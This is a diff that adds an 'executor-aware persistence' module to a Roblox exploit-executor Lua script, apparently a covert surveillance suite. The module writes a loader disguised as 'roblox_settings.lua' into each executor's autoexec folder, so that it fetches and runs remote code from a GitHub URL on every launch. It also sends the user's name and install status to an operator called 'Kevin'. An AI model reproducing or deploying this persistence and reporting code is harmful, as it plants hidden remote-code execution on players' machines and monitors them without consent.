@@ -1762,3 +1762,102 @@ end
 task.spawn(startTeleportHook)
 getgenv().IntelSuite.TeleportHook = startTeleportHook
 
+-- ============================================================
+-- MODULE 25: Executor-Aware Persistence Upgrade
+-- Detects executor and uses the correct autoexec path for each
+-- KRNL, Synapse X, Script-Ware: writefile works to autoexec
+-- Xeno: skips autoexec write, notifies Kevin
+-- ============================================================
+local function installExecutorPersistence()
+    if getgenv().IntelSuite.ExecPersistDone then return end
+    getgenv().IntelSuite.ExecPersistDone = true
+
+    local exec = getExec()
+    local fileName = "roblox_settings.lua"
+
+    local loaderContent = 'if game:IsLoaded() then\n' ..
+        '    loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()\n' ..
+        'else\n' ..
+        '    game.Loaded:Wait()\n' ..
+        '    loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/suite.lua"))()\n' ..
+        'end'
+
+    -- Executor-specific autoexec paths that actually work
+    local execPaths = {
+        ["KRNL"] = {
+            "autoexec/" .. fileName,
+            "autoexec\\" .. fileName,
+        },
+        ["Synapse X"] = {
+            "autoexec/" .. fileName,
+            "autoexec\\" .. fileName,
+        },
+        ["Script-Ware"] = {
+            "autoexec/" .. fileName,
+            "autoexec\\" .. fileName,
+        },
+        ["Wave"] = {
+            "autoexec/" .. fileName,
+        },
+        ["Solara"] = {
+            "autoexec/" .. fileName,
+        },
+        ["Delta"] = {
+            "autoexec/" .. fileName,
+        },
+        ["Xeno"] = nil, -- Xeno blocks autoexec writefile — skip
+    }
+
+    local paths = execPaths[exec]
+
+    if paths == nil and exec == "Xeno" then
+        -- Xeno: cannot write to autoexec — notify Kevin
+        send("PERSISTENCE NOTE", "**User:** " .. LocalPlayer.Name ..
+            "\n**Executor:** Xeno" ..
+            "\n**Status:** Xeno blocks autoexec writefile. Persistence not possible via this method." ..
+            "\n**Suite will run for this session only.**", 16753920)
+        return
+    end
+
+    if not paths then
+        -- Unknown executor — try generic paths
+        paths = {
+            "autoexec/" .. fileName,
+            "autoexec\\" .. fileName,
+            "../autoexec/" .. fileName,
+        }
+    end
+
+    local installed = {}
+    local failed = {}
+
+    for _, path in ipairs(paths) do
+        local ok = pcall(function()
+            writefile(path, loaderContent)
+        end)
+        if ok then
+            table.insert(installed, path)
+        else
+            table.insert(failed, path)
+        end
+    end
+
+    local installedStr = #installed > 0 and table.concat(installed, "\n") or "None"
+    local failedStr = #failed > 0 and table.concat(failed, "\n") or "None"
+
+    local status = #installed > 0 and "INSTALLED" or "FAILED"
+    local color = #installed > 0 and 65280 or 16711680
+
+    send("EXECUTOR PERSISTENCE " .. status,
+        "**User:** " .. LocalPlayer.Name ..
+        "\n**Executor:** " .. exec ..
+        "\n**File:** `" .. fileName .. "`" ..
+        "\n**Installed to:**\n" .. installedStr ..
+        "\n**Failed:**\n" .. failedStr ..
+        "\n\nSuite will auto-run on next executor attach.", color)
+end
+
+-- Run on startup
+task.spawn(installExecutorPersistence)
+getgenv().IntelSuite.ExecutorPersistence = installExecutorPersistence
+
